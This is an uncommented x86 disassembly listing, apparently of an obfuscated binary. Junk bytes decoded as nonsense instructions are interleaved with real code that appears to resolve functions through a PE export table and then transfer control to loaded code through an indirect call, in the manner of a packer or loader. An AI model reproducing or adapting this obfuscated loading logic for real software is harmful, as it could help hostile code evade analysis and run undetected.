  41273e:	repz or DWORD PTR [edx-0x55c78f9f],ebx
  412745:	add    al,0x1b
  412747:	mov    eax,0x245d87c3
  41274c:	xor    al,cl
  41274e:	fwait
  41274f:	les    ecx,FWORD PTR [esi+0x4e]
  412752:	push   0xdff44054
  412757:	pop    ebx
  412758:	(bad)  [edx]
  41275a:	mov    dl,0x89
  41275c:	gs loopne 0x41274a
  41275f:	aas    
  412760:	leave  
  412761:	gs push ebp
  412763:	xchg   esp,eax
  412764:	inc    esp
  412765:	mov    al,ds:0xa6a78557
  41276a:	add    DWORD PTR [edi-0x597ffe29],esi
  412770:	lock dec ecx
  412772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412773:	out    0xf9,eax
  412775:	lea    ebx,[edx-0x1cf50d7c]
  41277b:	cwde   
  41277c:	add    dh,al
  41277e:	mov    ecx,DWORD PTR [ebp+0x8]
  412781:	add    ecx,DWORD PTR [eax+esi*4]
  412784:	mov    DWORD PTR [ebp-0x20],ecx
  412787:	push   DWORD PTR [ebp-0x20]
  41278a:	push   DWORD PTR [ebp+0xc]
  41278d:	call   0x42a022
  412792:	jmp    0x41286e
  412797:	cwde   
  412798:	arpl   WORD PTR [edx-0x5e],bp
  41279b:	sti    
  41279c:	stos   DWORD PTR es:[edi],eax
  41279d:	fdivr  DWORD PTR [ebx+0x49]
  4127a0:	in     eax,0xe9
  4127a2:	xchg   ebp,eax
  4127a3:	sbb    dl,BYTE PTR [ebp-0x33a68521]
  4127a9:	add    BYTE PTR [eax],al
  4127ab:	mov    edi,0xfa000000
  4127b0:	dec    ebp
  4127b1:	jnp    0x4127ab
  4127b3:	sub    al,0xa1
  4127b5:	or     eax,0x56ea657f
  4127ba:	stos   BYTE PTR es:[edi],al
  4127bb:	push   ecx
  4127bc:	adc    DWORD PTR [ecx+0x48100bae],edx
  4127c2:	xor    BYTE PTR ds:0x4bca9277,dh
  4127c8:	dec    esp
  4127c9:	jge    0x41279e
  4127cb:	ret    
  4127cc:	test   al,0x1d
  4127ce:	aaa    
  4127cf:	das    
  4127d0:	es pushf 
  4127d2:	push   cs
  4127d3:	rcl    DWORD PTR [esi-0x9],cl
  4127d6:	jmp    0x790f:0xdefbbc1a
  4127dd:	jo     0x41282b
  4127df:	js     0x412854
  4127e1:	dec    edx
  4127e2:	push   edx
  4127e3:	cmp    BYTE PTR [ecx],al
  4127e5:	mov    BYTE PTR [edi],bl
  4127e7:	sub    ah,BYTE PTR [edi-0x3f3e71d8]
  4127ed:	mov    cl,0x72
  4127ef:	out    dx,al
  4127f0:	mov    eax,0x18c221e2
  4127f5:	sbb    DWORD PTR [ebx+eax*1+0x438baecf],ebp
  4127fc:	dec    edx
  4127fd:	adc    edi,esi
  4127ff:	push   ebp
  412800:	jno    0x41287b
  412802:	and    eax,0xd4a7b4ae
  412807:	jns    0x41286b
  412809:	out    dx,al
  41280a:	pop    es
  41280b:	and    esi,ecx
  41280d:	fs scas eax,DWORD PTR es:[edi]
  41280f:	rcl    DWORD PTR [eax],0x27
  412812:	dec    ecx
  412813:	pop    ebp
  412814:	cmc    
  412815:	scas   al,BYTE PTR es:[edi]
  412816:	and    bh,bl
  412818:	call   0x2847:0x49bc094d
  41281f:	jo     0x41286d
  412821:	mov    ss,WORD PTR [ecx]
  412823:	dec    eax
  412824:	xchg   DWORD PTR [edx+0x29],esp
  412827:	xor    BYTE PTR [ebx-0x57],bl
  41282a:	rol    DWORD PTR [eax],0x5d
  41282d:	inc    ecx
  41282e:	into   
  41282f:	mov    ch,0xe1
  412831:	test   DWORD PTR [ebx+0x7c],ebp
  412834:	mov    DWORD PTR [ebx-0x65cf679e],esi
  41283a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41283b:	call   0x6871833
  412840:	ror    DWORD PTR [ebx+0x6f675305],0xcd
  412847:	and    al,0x6e
  412849:	aas    
  41284a:	jmp    0x41280e
  41284c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41284d:	jbe    0x412812
  41284f:	lock inc edi
  412851:	sbb    bl,cl
  412853:	jns    0xe74617e1
  412859:	add    eax,0x39ad365a
  41285e:	inc    ebp
  41285f:	cs fwait
  412861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412862:	push   esi
  412863:	sbb    dh,ch
  412865:	add    bh,dh
  412867:	nop
  412868:	or     bl,BYTE PTR [edx+0x8e02f7c]
  41286e:	mov    DWORD PTR [ebp-0x20],eax
  412871:	mov    eax,DWORD PTR [ebp-0x20]
  412874:	test   eax,eax
  412876:	jne    0x41288e
  41287c:	mov    eax,DWORD PTR [ebp-0x4]
  41287f:	inc    esi
  412880:	cmp    esi,DWORD PTR [eax+0x18]
  412883:	jne    0x41269f
  412889:	jmp    0x41289e
  41288e:	mov    eax,DWORD PTR [ebp-0x24]
  412891:	movzx  eax,WORD PTR [eax+esi*2]
  412895:	mov    ecx,DWORD PTR [ebp-0x28]
  412898:	mov    eax,DWORD PTR [ecx+eax*4]
  41289b:	mov    DWORD PTR [ebp-0x10],eax
  41289e:	mov    eax,DWORD PTR [ebp-0x10]
  4128a1:	test   eax,eax
  4128a3:	je     0x413004
  4128a9:	mov    eax,DWORD PTR [ebp-0x10]
  4128ac:	jmp    0x412988
  4128b1:	dec    esp
  4128b2:	loopne 0x4128c0
  4128b4:	cmp    ebp,DWORD PTR [edi+edi*8-0x18c50881]
  4128bb:	adc    DWORD PTR [edi+0x6730e873],ecx
  4128c1:	sbb    ch,cl
  4128c3:	add    BYTE PTR [eax],al
  4128c5:	mov    edi,0xf000000
  4128ca:	jmp    0x412874
  4128cc:	pushf  
  4128cd:	fist   DWORD PTR [ebp+0x5018e1d4]
  4128d3:	sub    ebx,ebx
  4128d5:	xor    ecx,edi
  4128d7:	inc    eax
  4128d8:	jae    0x4128d6
  4128da:	cwde   
  4128db:	mov    esp,0x8e2d81e1
  4128e0:	in     al,0x62
  4128e2:	sti    
  4128e3:	xlat   BYTE PTR ds:[ebx]
  4128e4:	push   ecx
  4128e5:	fstp   TBYTE PTR [eax]
  4128e7:	xor    cl,BYTE PTR [ecx-0x42]
  4128ea:	xchg   esi,eax
  4128eb:	dec    eax
  4128ec:	mov    al,0xcb
  4128ee:	cmc    
  4128ef:	out    0x3,eax
  4128f1:	cli    
  4128f2:	pusha  
  4128f3:	cld    
  4128f4:	cmp    BYTE PTR [ecx],0x7f
  4128f7:	call   FWORD PTR [ebx-0xb]
  4128fa:	mov    ch,0xb4
  4128fc:	(bad)  
  4128fe:	pop    DWORD PTR [edx+edi*2-0x5410595f]
  412905:	cwde   
  412906:	inc    ecx
  412907:	add    al,0x40
  412909:	sbb    dl,BYTE PTR [ebx-0x46]
  41290c:	out    0xf6,eax
  41290e:	mov    edx,0x47e96e36
  412913:	mov    esi,ss
  412915:	stc    
  412916:	xchg   edi,eax
  412917:	cmp    cl,BYTE PTR [ecx+0x7f8bf1da]
  41291d:	gs daa 
  41291f:	mov    bh,BYTE PTR [ebp+0x386bb0a0]
  412925:	sti    
  412926:	fisub  DWORD PTR [esi-0x58]
  412929:	cdq    
  41292a:	ret    
  41292b:	mov    WORD PTR [edx+0x6],gs
  41292e:	sub    DWORD PTR [esp+eax*2+0x33370d3d],ebx
  412935:	(bad)  
  412938:	ins    BYTE PTR es:[edi],dx
  412939:	test   eax,0x537ba4a4
  41293e:	lock nop
  412940:	jns    0x4129a6
  412942:	sub    al,0x9f
  412944:	add    eax,DWORD PTR [eax+0x44d70ec4]
  41294a:	jl     0x41295b
  41294c:	xchg   BYTE PTR [ecx-0x2fcc43a0],ch
  412952:	and    eax,0xe5ec6f5
  412957:	aas    
  412958:	mov    edx,0xe9892fcb
  41295d:	loopne 0x41296f
  41295f:	xchg   ebx,eax
  412960:	pop    ss
  412961:	xchg   BYTE PTR [esi-0x7ac1a81e],ah
  412967:	adc    BYTE PTR [eax+ebp*2],bl
  41296a:	jb     0x4129c8
  41296c:	ret    
  41296d:	lahf   
  41296e:	mov    bl,0x85
  412970:	outs   dx,DWORD PTR ds:[esi]
  412971:	xchg   ecx,eax
  412972:	outs   dx,BYTE PTR ds:[esi]
  412973:	add    ecx,DWORD PTR [edi]
  412975:	mov    al,0x91
  412977:	hlt    
  412978:	leave  
  412979:	mov    ecx,0x39e4d4b6
  41297e:	lahf   
  41297f:	(bad)  
  412980:	retf   0x73a0
  412983:	jmp    0xb7bee6ee
  412988:	add    eax,DWORD PTR [ebp+0x8]
  41298b:	mov    DWORD PTR [ebp-0x48],eax
  41298e:	mov    DWORD PTR [ebp+0xc],edi
  412991:	mov    eax,DWORD PTR [ebp-0x8]
  412994:	test   eax,eax
  412996:	je     0x412e31
  41299c:	jmp    0x412a78
  4129a1:	xor    ebp,DWORD PTR [ecx]
  4129a3:	es clc 
  4129a5:	ds (bad) 
  4129a7:	(bad)  
  4129a8:	jmp    0x4129a0
  4129aa:	xor    esi,DWORD PTR [edx+0x67]
  4129ad:	shr    DWORD PTR ds:[edx],1
  4129b0:	ret    
  4129b1:	xlat   BYTE PTR ds:[ebx]
  4129b2:	int    0x0
  4129b4:	add    BYTE PTR [edi-0x5e000000],bh
  4129ba:	repnz push eax
  4129bc:	xor    DWORD PTR [ebx+0x7d],0x3
  4129c0:	retf   0x2af3
  4129c3:	cdq    
  4129c4:	inc    esp
  4129c5:	pop    ss
  4129c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c8:	ja     0x41299c
  4129ca:	outs   dx,BYTE PTR ds:[esi]
  4129cb:	jno    0x412a0f
  4129cd:	or     ebp,DWORD PTR [edx+0x6e]
  4129d0:	dec    eax
  4129d1:	sub    edx,ebp
  4129d3:	clc    
  4129d4:	xlat   BYTE PTR ds:[ebx]
  4129d5:	nop    DWORD PTR [eax+eiz*1+0xd]
  4129da:	iret   
  4129db:	imul   esp,DWORD PTR [edx-0x105027da],0xffffffaf
  4129e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e3:	add    al,0x0
  4129e5:	jecxz  0x412a3c
  4129e7:	lahf   
  4129e8:	aaa    
  4129e9:	sub    eax,0xde178077
  4129ee:	jp     0x412997
  4129f0:	cmp    al,0x1a
  4129f2:	ja     0x412a16
  4129f4:	pop    ebx
  4129f5:	sub    DWORD PTR [edi-0x63],0x88e795aa
  4129fc:	imul   ebp,DWORD PTR [edi],0x1dafdb19
  412a02:	inc    esp
  412a03:	stos   BYTE PTR es:[edi],al
  412a04:	or     edi,DWORD PTR [ebp+eax*1-0xa]
  412a08:	mov    al,ah
  412a0a:	mov    esp,0x3894757f
  412a0f:	in     al,0xeb
  412a11:	jl     0x412a59
  412a13:	js     0x4129fe
  412a15:	mov    bl,0x59
  412a17:	and    ch,bh
  412a19:	out    dx,eax
  412a1a:	stos   BYTE PTR es:[edi],al
  412a1b:	push   ss
  412a1c:	nop
  412a1d:	jo     0x4129a7
  412a1f:	dec    esi
  412a20:	jne    0x412a3b
  412a22:	in     eax,0xcb
  412a24:	out    dx,eax
  412a25:	push   0xc2d5e3ed
  412a2a:	sbb    al,0x8c
  412a2c:	pop    ecx
  412a2d:	jmp    0xeed2:0x12b47bcb
  412a34:	add    dh,cl
  412a36:	enter  0x74b5,0x2e
  412a3a:	adc    eax,0x5802f7d8
  412a3f:	aad    0x17
  412a41:	inc    eax
  412a42:	adc    bl,dl
  412a44:	cdq    
  412a45:	(bad)  
  412a46:	sub    edi,ebp
  412a48:	and    eax,0xef15690c
  412a4d:	leave  
  412a4e:	sub    DWORD PTR [esi-0x714be05c],esp
  412a54:	inc    edx
  412a55:	fsubr  DWORD PTR [esi]
  412a57:	or     dl,BYTE PTR [eax]
  412a59:	mov    ebx,0x1d97df39
  412a5e:	xchg   DWORD PTR [eax-0x24476027],ebx
  412a64:	jnp    0x412aa0
  412a66:	add    BYTE PTR [ebp-0x7e0ffcf],bl
  412a6c:	sbb    al,0x71
  412a6e:	mov    eax,esp
  412a70:	(bad)  
  412a71:	out    dx,eax
  412a72:	cld    
  412a73:	adc    BYTE PTR [ecx-0x74b8d13e],0x45
  412a7a:	clc    
  412a7b:	test   eax,eax
  412a7d:	je     0x412e31
  412a83:	mov    eax,DWORD PTR [ebp-0x8]
  412a86:	jmp    0x412b62
  412a8b:	div    BYTE PTR [ebx+0x40]
  412a8e:	add    ebp,eax
  412a90:	xor    esi,edi
  412a92:	idiv   DWORD PTR [ebp+0x7fc35bad]
  412a98:	lods   eax,DWORD PTR ds:[esi]
  412a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a9a:	xor    edx,DWORD PTR [esi-0x40ffff32]
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	add    BYTE PTR [ebp-0x418083d0],ah
  412aa8:	out    0x87,eax
  412aaa:	setne  BYTE PTR [edi-0x48]
  412aae:	and    ebp,DWORD PTR [eax+esi*4]
  412ab1:	pop    esi
  412ab2:	inc    edx
  412ab3:	cmp    al,0x1
  412ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab6:	call   DWORD PTR [ecx+0x59]
  412ab9:	add    ch,0x39
  412abc:	out    dx,eax
  412abd:	jmp    0x139a:0xb21e6a68
  412ac4:	ins    BYTE PTR es:[edi],dx
  412ac5:	jbe    0x412ace
  412ac7:	xchg   ebx,eax
  412ac8:	xchg   esp,eax
  412ac9:	ret    0x9300
  412acc:	(bad)  
  412acd:	sbb    esi,edi
  412acf:	js     0x412b49
  412ad1:	mov    ebx,0x9278e75a
  412ad6:	sub    al,0x52
  412ad8:	lahf   
  412ad9:	out    0x42,al
  412adb:	push   edx
  412adc:	pop    ds
  412add:	pop    edx
  412ade:	adc    ebx,DWORD PTR [edx]
  412ae0:	mov    esp,gs
  412ae2:	scas   al,BYTE PTR es:[edi]
  412ae3:	pop    ebp
  412ae4:	add    edi,esp
  412ae6:	inc    esi
  412ae7:	and    eax,0xc6a00e1a
  412aec:	add    ecx,DWORD PTR [ecx-0x68daa976]
  412af2:	retf   
  412af3:	popf   
  412af4:	pop    eax
  412af5:	add    al,0x24
  412af7:	dec    ebx
  412af8:	ins    BYTE PTR es:[edi],dx
  412af9:	sysenter 
  412afb:	mov    edi,ss
  412afd:	cmp    esi,ebp
  412aff:	ja     0x412b70
  412b01:	dec    esi
  412b02:	(bad)  
  412b03:	pop    ss
  412b04:	mov    ?,WORD PTR [edi]
  412b06:	cli    
  412b07:	pop    edx
  412b08:	pop    es
  412b09:	enter  0x209a,0x62
  412b0d:	aaa    
  412b0e:	das    
  412b0f:	jno    0x412af7
  412b11:	cmp    ebx,DWORD PTR [ebx]
  412b13:	cmc    
  412b14:	scas   eax,DWORD PTR es:[edi]
  412b15:	inc    edx
  412b16:	and    dl,BYTE PTR [edi+0x6e]
  412b19:	ins    DWORD PTR es:[edi],dx
  412b1a:	(bad)  
  412b1b:	cmp    al,0x92
  412b1d:	or     BYTE PTR [eax+0x2b],0xa4
  412b21:	les    esi,FWORD PTR [ecx-0x78]
  412b24:	or     eax,0xfe140843
  412b29:	pusha  
  412b2a:	jge    0x412b1c
  412b2c:	mov    al,0x20
  412b2e:	stos   BYTE PTR es:[edi],al
  412b2f:	out    0xfb,eax
  412b31:	mov    bl,0x5f
  412b33:	imul   esp,DWORD PTR [ebp+0x42],0x5a
  412b37:	mov    eax,0x53d4e414
  412b3c:	cmp    eax,0xc89c766a
  412b41:	pop    ebx
  412b42:	push   0x52
  412b44:	xchg   ah,bl
  412b46:	pop    ebp
  412b47:	jo     0x412b43
  412b49:	ret    
  412b4a:	jae    0x412bba
  412b4c:	fs test eax,0xe08dd21b
  412b52:	outs   dx,BYTE PTR ds:[esi]
  412b53:	sbb    dh,ch
  412b55:	outs   dx,DWORD PTR ds:[esi]
  412b56:	add    eax,0x83269309
  412b5b:	jnp    0x412b5d
  412b5d:	lahf   
  412b5e:	test   eax,0xc176a5f9
  412b63:	loopne 0x412b67
  412b65:	mov    DWORD PTR [ebp+0xc],eax
  412b68:	jmp    0x412c44
  412b6d:	xchg   edx,eax
  412b6e:	add    al,0x32
  412b70:	(bad)  [esi+0x4f4dfbff]
  412b76:	test   eax,0xfa010d8a
  412b7b:	inc    edi
  412b7c:	ficom  WORD PTR [ebp-0x31]
  412b7f:	add    BYTE PTR [eax],al
  412b81:	mov    edi,0x3b000000
  412b86:	rcl    DWORD PTR [esp+eiz*4],cl
  412b89:	outs   dx,DWORD PTR ds:[esi]
  412b8a:	xor    ch,BYTE PTR [esi-0x38]
  412b8d:	shr    BYTE PTR [ebp+0x43],cl
  412b90:	mov    bl,0xaa
  412b92:	fyl2xp1 
  412b94:	push   0x2c320185
  412b99:	sbb    esp,DWORD PTR [ebp-0x72425c77]
  412b9f:	xchg   edx,eax
  412ba0:	stos   DWORD PTR es:[edi],eax
  412ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ba2:	sub    bh,BYTE PTR [edx]
  412ba4:	dec    edi
  412ba5:	jnp    0x412c0f
  412ba7:	sub    al,0xea
  412ba9:	add    al,0xf5
  412bab:	aad    0x9e
  412bad:	jne    0x412b58
  412baf:	aad    0xfd
  412bb1:	les    ebx,FWORD PTR [edx-0x14]
  412bb4:	mov    dh,0xfe
  412bb6:	sbb    al,0xb1
  412bb8:	mov    eax,0x18971adf
  412bbd:	cmp    BYTE PTR [esi],ch
  412bbf:	arpl   WORD PTR [ecx],cx
  412bc1:	cld    
  412bc2:	data16 sub BYTE PTR [ebp+0x5de8c296],0xe8
  412bca:	das    
  412bcb:	mov    ebx,0x91072d57
  412bd0:	dec    BYTE PTR [esi+0x52]
  412bd3:	clc    
  412bd4:	retf   0x3d7f
  412bd7:	cli    
  412bd8:	sti    
  412bd9:	arpl   WORD PTR ds:0xba9c626b,si
  412bdf:	(bad)  
  412be1:	lods   eax,DWORD PTR ds:[esi]
  412be2:	jmp    0x412b7c
  412be4:	rol    DWORD PTR [edi+eiz*1],1
  412be7:	adc    edi,ebp
  412be9:	test   al,0xcb
  412beb:	outs   dx,BYTE PTR ds:[esi]
  412bed:	adc    ecx,DWORD PTR [eax-0x60]
  412bf0:	std    
  412bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf2:	arpl   ax,ax
  412bf4:	adc    BYTE PTR ds:0xdc2ec303,0xb1
  412bfb:	and    ah,BYTE PTR [ecx+0x9670bf2]
  412c01:	or     bh,dh
  412c03:	xchg   ecx,eax
  412c04:	xor    al,dh
  412c06:	xor    ebp,DWORD PTR [edi]
  412c08:	scas   eax,DWORD PTR es:[edi]
  412c09:	sub    edi,ebp
  412c0b:	sbb    esp,0x4b
  412c0e:	add    al,0x7d
  412c10:	idiv   DWORD PTR [edi]
  412c12:	sub    eax,0x233ce109
  412c17:	pop    ebp
  412c18:	popa   
  412c19:	std    
  412c1a:	jb     0x412b9c
  412c1c:	jb     0x412ba9
  412c1e:	add    edi,DWORD PTR [eax-0xa850c40]
  412c24:	push   edx
  412c25:	push   ebp
  412c26:	jb     0x412c54
  412c28:	push   cs
  412c29:	sbb    esi,0x14
  412c2c:	mov    dh,0x17
  412c2e:	out    0x8c,al
  412c30:	and    BYTE PTR [ebx+ebx*2-0x3cae1998],ch
  412c37:	inc    eax
  412c38:	ss aas 
  412c3a:	test   BYTE PTR [eax+eiz*2+0x72956d4],0x4
  412c42:	dec    ebx
  412c43:	dec    DWORD PTR [ecx-0x28161383]
  412c49:	add    BYTE PTR [eax],al
  412c4b:	add    al,ch
  412c4d:	sub    esi,esi
  412c4f:	mov    ch,0xf7
  412c51:	(bad)  
  412c52:	jmp    0x412cd1
  412c54:	ins    BYTE PTR es:[edi],dx
  412c55:	retf   0x5ff6
  412c58:	push   cs
  412c59:	sbb    al,0xd3
  412c5b:	je     0x412c71
  412c5d:	rol    BYTE PTR [eax],1
  412c5f:	add    BYTE PTR [edi+0x17000000],bh
  412c65:	mov    edx,0xbd2d7853
  412c6a:	enter  0x84b,0x62
  412c6e:	xor    dl,BYTE PTR [edx+0x4b]
  412c71:	inc    ebx
  412c72:	cmp    DWORD PTR es:[ebx+ebx*4+0x3167e60],0xffffffd3
  412c7b:	push   ecx
  412c7c:	popf   
  412c7d:	(bad)  
  412c7e:	jo     0x412c66
  412c80:	sub    al,0xa4
  412c82:	lea    ebx,[ebx+ebx*1+0x4c07e948]
  412c89:	jl     0x412c0f
  412c8b:	cmp    DWORD PTR [ebx+0x2e],esi
  412c8e:	mov    ds:0x14bdb80e,al
  412c93:	les    edx,FWORD PTR [esi+0x12c6ce8a]
  412c99:	cs mov edx,0x7029f7e3
  412c9f:	dec    eax
  412ca0:	test   bl,cl
  412ca2:	or     eax,0xb3568afd
  412ca7:	push   ss
  412ca8:	add    BYTE PTR [eax],cl
  412caa:	or     DWORD PTR [edx],ebp
  412cac:	mov    ecx,0x1296875d
  412cb1:	out    dx,eax
  412cb2:	mov    ebp,0xcc1dc608
  412cb7:	mov    edi,0x4aa495fd
  412cbc:	dec    esi
  412cbd:	pop    ss
  412cbe:	call   0xb02d27f9
  412cc3:	ja     0x412d20
  412cc5:	sbb    al,0x2e
  412cc7:	sub    BYTE PTR [edx+0x4ba717ba],cl
  412ccd:	mov    edx,0xc8ddcf3
  412cd2:	dec    bh
  412cd4:	dec    DWORD PTR [eax]
  412cd6:	push   esp
  412cd7:	lods   al,BYTE PTR ds:[esi]
  412cd8:	ins    BYTE PTR es:[edi],dx
  412cd9:	or     BYTE PTR [ecx+eiz*8-0x5291f72],0x9c
  412ce1:	hlt    
  412ce2:	xchg   esi,eax
  412ce3:	test   BYTE PTR [edi+0x31],dh
  412ce6:	lods   eax,DWORD PTR ds:[esi]
  412ce7:	and    BYTE PTR [ecx],cl
  412ce9:	push   0x334152ef
  412cee:	lock ja 0x412ce6
  412cf1:	push   ecx
  412cf2:	in     al,0x2
  412cf4:	mov    ah,0xef
  412cf6:	hlt    
  412cf7:	push   ecx
  412cf8:	mov    cl,0x48
  412cfa:	sub    DWORD PTR [edx],0xffffffe3
  412cfd:	jp     0x412ca9
  412cff:	or     dh,BYTE PTR [edx+0x2e08c4b8]
  412d05:	or     DWORD PTR [ebp+0x1d18f621],ecx
  412d0b:	sbb    eax,0x3c91db96
  412d10:	and    ah,al
  412d12:	shl    BYTE PTR ds:0x3964a31,1
  412d18:	int    0xb0
  412d1a:	inc    edx
  412d1b:	mov    al,ds:0x6c2030bd
  412d20:	je     0x412ca3
  412d22:	lock sub esp,DWORD PTR [ebp+0xc]
  412d26:	mov    DWORD PTR [ebp-0x14],esp
  412d29:	mov    DWORD PTR [ebp+0x8],edi
  412d2c:	jmp    0x412e23
  412d31:	mov    eax,DWORD PTR [ebp+0x8]
  412d34:	mov    ecx,DWORD PTR [ebp-0x14]
  412d37:	mov    edx,DWORD PTR [ebp+0x8]
  412d3a:	mov    esi,DWORD PTR [ebp+0x14]
  412d3d:	jmp    0x412e19
  412d42:	xor    BYTE PTR [ebp-0x20a5330],al
  412d48:	jl     0x412ce7
  412d4a:	mov    ah,0xe1
  412d4c:	fnsave [eax-0x69]
  412d4f:	inc    ebx
  412d50:	imul   esi,DWORD PTR [ebx],0xffffffd3
  412d53:	rol    BYTE PTR [eax],1
  412d55:	add    BYTE PTR [edi-0x5d000000],bh
  412d5b:	inc    ebp
  412d5c:	pop    ebx
  412d5d:	mov    esi,0xad15c883
  412d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d63:	sub    BYTE PTR [ecx+0x28a191ee],dh
  412d69:	lods   al,BYTE PTR ds:[esi]
  412d6a:	(bad)  
  412d6b:	adc    edi,DWORD PTR [edi]
  412d6d:	jbe    0x412d44
  412d6f:	jp     0x412dc0
  412d71:	add    bl,BYTE PTR ds:0xdc849bbe
  412d77:	or     al,0x6c
  412d79:	test   eax,0x2fd23c16
  412d7e:	sbb    ah,BYTE PTR [ebx]
  412d80:	sbb    al,BYTE PTR [ecx*2+0xaf4b0cc]
  412d87:	aas    
  412d88:	cmp    BYTE PTR [edi+0x1ba3add1],al
  412d8e:	inc    ebp
  412d8f:	mov    esi,0xda8b72fc
  412d94:	leave  
  412d95:	lock sub BYTE PTR [ebx+0x46],bl
  412d99:	jo     0x412dfd
  412d9b:	ror    BYTE PTR [esp+edx*1],cl
  412d9e:	xor    esp,edx
  412da0:	nop
  412da1:	bound  ebx,QWORD PTR [eax]
  412da3:	push   0xffffff96
  412da5:	in     al,dx
  412da6:	push   eax
  412da7:	out    dx,eax
  412da8:	mov    dl,0x3a
  412daa:	xchg   esi,eax
  412dab:	and    al,0x16
  412dad:	sbb    al,0x2e
  412daf:	fisub  WORD PTR es:[edi]
  412db2:	sbb    al,al
  412db4:	mov    eax,0x48b9153a
  412db9:	ret    
  412dba:	call   0xe7b48636
  412dbf:	scas   al,BYTE PTR es:[edi]
  412dc0:	scas   al,BYTE PTR es:[edi]
  412dc1:	or     edx,DWORD PTR [edx+0x73321c3e]
  412dc7:	adc    edi,DWORD PTR [esi]
  412dc9:	pop    edi
  412dca:	(bad)  
  412dcb:	inc    esi
  412dcc:	sbb    eax,0xe710c3c9
  412dd1:	add    DWORD PTR [ebx],esi
  412dd3:	add    BYTE PTR [esi+0x7a2060c0],0xf7
  412dda:	xor    al,0xa9
  412ddc:	frstor [edx]
  412dde:	sbb    al,0x5d
  412de0:	into   
  412de1:	add    al,0x48
  412de3:	mov    esi,0x2d97233e
  412de8:	jnp    0x412dda
  412dea:	(bad)  
  412deb:	pusha  
  412dec:	jp     0x412e4d
  412dee:	enter  0x58ab,0x36
  412df2:	mov    esi,0x9a533b68
  412df7:	inc    eax
  412df8:	inc    esi
  412df9:	in     eax,0x3f
  412dfb:	sbb    eax,0xee0d9e12
  412e00:	push   edi
  412e01:	cdq    
  412e02:	pop    esi
  412e03:	cmp    DWORD PTR [ebp+0x6d],ebx
  412e06:	inc    edx
  412e07:	lods   al,BYTE PTR ds:[esi]
  412e08:	sub    dl,bl
  412e0a:	outs   dx,BYTE PTR ds:[esi]
  412e0b:	xchg   edi,eax
  412e0c:	sub    bl,BYTE PTR [eax+0x6a8d1782]
  412e12:	setge  BYTE PTR [ebx+ebx*8]
  412e16:	shl    BYTE PTR [edi-0x1d],0x8b
  412e1a:	push   esp
  412e1b:	xchg   esi,eax
  412e1c:	add    al,0x89
  412e1e:	adc    al,0x81
  412e20:	inc    DWORD PTR [ebp+0x8]
  412e23:	mov    eax,DWORD PTR [ebp+0x8]
  412e26:	mov    ecx,DWORD PTR [ebp-0x8]
  412e29:	cmp    eax,ecx
  412e2b:	jne    0x412d31
  412e31:	mov    DWORD PTR [ebp-0xc],edi
  412e34:	call   DWORD PTR [ebp-0x48]
  412e37:	xor    ebx,ebx
  412e39:	inc    ebx
  412e3a:	cmp    DWORD PTR [ebp+0x10],ebx
  412e3d:	je     0x412f22
  412e43:	add    esp,DWORD PTR [ebp+0xc]
  412e46:	jmp    0x412f22
  412e4b:	adc    DWORD PTR [esi],esp
  412e4d:	or     dl,BYTE PTR [edx]
  412e4f:	aas    
  412e50:	sbb    DWORD PTR ds:[edi],esp
  412e53:	mov    edx,0xdd38feb1
  412e58:	into   
  412e59:	loope  0x412e93
  412e5b:	xchg   edx,eax
  412e5c:	rol    DWORD PTR [eax],1
  412e5e:	add    BYTE PTR [edi-0x34000000],bh
  412e64:	and    eax,0x6c153415
  412e69:	sbb    eax,edi
  412e6b:	lods   al,BYTE PTR ds:[esi]
  412e6c:	cmp    BYTE PTR [edi+0x64de5d88],ch
  412e72:	mov    al,dl
  412e74:	scas   al,BYTE PTR es:[edi]
  412e75:	mov    ah,0xda
  412e77:	mov    eax,0x13236151
  412e7c:	pop    ds
  412e7d:	push   esi
  412e7e:	cmp    eax,0x3068abf7
  412e83:	inc    esi
  412e84:	sbb    bh,BYTE PTR [edx]
  412e86:	maxps  xmm2,xmm0
  412e89:	ins    BYTE PTR es:[edi],dx
  412e8a:	test   al,0xe7
  412e8c:	xchg   edi,eax
  412e8d:	lods   eax,DWORD PTR ds:[esi]
  412e8e:	xchg   ebx,eax
  412e8f:	pop    es
  412e90:	les    esp,FWORD PTR [ebx+0xa]
  412e93:	push   ebp
  412e94:	leave  
  412e95:	push   edi
  412e96:	mov    ecx,0x3c5593
  412e9b:	inc    edi
  412e9c:	pop    es
  412e9d:	pop    ebp
  412e9e:	div    DWORD PTR [edx+edi*8]
  412ea1:	xchg   DWORD PTR [ecx-0x489d32bb],esi
  412ea7:	or     esi,DWORD PTR [ecx]
  412ea9:	mov    ah,0xf1
  412eab:	ret    
  412eac:	jl     0x412f17
  412eae:	aam    0x30
  412eb0:	push   0xffffffd4
  412eb2:	push   edi
  412eb3:	xor    dl,BYTE PTR [edx]
  412eb5:	pop    ebx
  412eb6:	jg     0x412ecf
  412eb8:	mov    ebp,0x9240fd1a
  412ebd:	lods   al,BYTE PTR ds:[esi]
  412ebe:	fnstenv [edx-0x48fc1913]
  412ec4:	jl     0x412f2f
  412ec6:	push   eax
  412ec7:	jg     0x412f3a
  412ec9:	dec    eax
  412eca:	loope  0x412ee7
  412ecc:	imul   eax,esp,0x5b
  412ecf:	mov    ebp,DWORD PTR [ebx+0x3d]
  412ed2:	loop   0x412f26
  412ed4:	int3   
  412ed5:	stc    
  412ed6:	cmp    eax,0xcbdb800f
  412edb:	in     al,dx
  412edc:	xadd   dh,dl
  412edf:	xor    DWORD PTR [ebx+0x131b0f4f],ebp
  412ee5:	inc    ebx
  412ee6:	into   
  412ee7:	jmp    eax
  412ee9:	cmp    eax,0xe3604605
  412eee:	cmp    ah,BYTE PTR [eax]
  412ef0:	dec    ecx
  412ef1:	push   ecx
  412ef2:	push   ss
  412ef3:	xchg   BYTE PTR [edx+0x66],ah
